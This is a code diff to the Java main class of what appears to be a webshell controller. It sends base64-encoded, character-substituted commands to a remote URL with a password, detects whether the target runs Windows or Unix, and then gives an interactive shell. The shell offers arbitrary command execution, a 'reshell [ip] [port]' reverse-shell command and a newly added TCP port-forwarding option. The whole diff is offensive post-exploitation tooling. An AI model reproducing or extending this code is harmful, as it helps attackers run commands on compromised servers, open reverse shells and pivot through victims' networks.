@@ -14,6 +14,7 @@ public class Main {
 	 */
 	public static String cmd;
 	public static String shell;
+	public static String tcpd;
 	public static String url;
 	public static String pass;
 	public static String key;
@@ -45,34 +46,45 @@ public class Main {
 			pass=args[1];
 			key=args[2];
 			words=args[3];
+//			System.out.println(url);
+//			System.out.println(pass);
+//			System.out.println(key);
+//			System.err.println(words);
 			if (key.length()!=words.length()) {
 				return;
 			}
 			cmd=Util.Readtext("cmd");
 			shell=Util.Readtext("shell");
+			tcpd=Util.Readtext("tcpd");
 			String win=cmd.replace("%cmd%", "cmd /c echo ok");
-			String unix=cmd.replace("%cmd%", "sh -c 'echo ok'");
+			String unix=cmd.replace("%cmd%", "echo ok");
 			String win_de=new String(encoder.encode(win.getBytes()));
 			String unix_de=new String(encoder.encode(unix.getBytes()));
 			win_de=Util.EnChar(win_de, key, words);
 			unix_de=Util.EnChar(unix_de, key, words);
-			if (Util.GetStatuscode(pass,url, win_de, key, words)==200) {
-				System.err.println("eg:");
+			
+//			System.out.println(Util.GetResponseString(pass,url, unix_de, key, words));
+//			System.exit(0);
+			if (Util.GetResponseString(pass,url, win_de, key, words).trim().equals("ok")) {
+				System.err.println("win eg:");
 				System.out.println("1. exec [command]	           //执行一个命令");
 				System.out.println("2. reshell [ip] [port]         //反弹shell到指定端口");
-				System.out.println("3. portmap                     //开启端口映射");
+//				System.out.println("3. portmap                     //开启端口映射");
 				DoHome("win");
-				
-			}else if (Util.GetStatuscode(pass,url, unix_de, key, words)==200) {
-				System.out.println("unix");
-				
+			}else if (Util.GetResponseString(pass,url, unix_de, key, words).trim().equals("ok")) {
+				System.err.println("unix eg:");
+				System.out.println("1. exec [command]	           //执行一个命令");
+				System.out.println("2. reshell [ip] [port]         //反弹shell到指定端口");
+//				System.out.println("3. portmap                     //开启端口映射");
+				DoHome("unix");
 			}else {
-				System.out.println("执行失败");
+				System.out.println("连接失败");
 			}
 			
 			break;
 		}	
 	}
+	
 	public static void DoHome(String pfm) {
 		System.out.print("shell$");
 		Scanner scanner=new Scanner(System.in);
@@ -86,7 +98,7 @@ public class Main {
 		case "exec":
 			if (list.size()>=2) {
 				String res=Util.DoCode(pfm,list);
-				System.out.println(res);
+				System.out.print(res);
 			}else {
 				System.out.println("eg:exec whoami");
 			}
@@ -95,14 +107,20 @@ public class Main {
 		case  "reshell":
 			if (list.size()==3) {
 				String res=Util.reshell(pfm, list);
-				System.out.println(res);
+				System.out.print(res);
 			}else {
 				System.out.println("eg:reshell 1.1.1.1 8889");
 			}
 			Main.DoHome(pfm);
 			break;
 		case "tgcd":
-			
+			if (list.size()==5) {
+				String res=Util.tcpd(pfm, list);
+				System.out.print(res);
+			}else {
+				System.out.println("eg:tcpd [rip] [rport] [toip] [toport]");
+			}
+			Main.DoHome(pfm);
 			break;
 		default:
 			Main.DoHome(pfm);
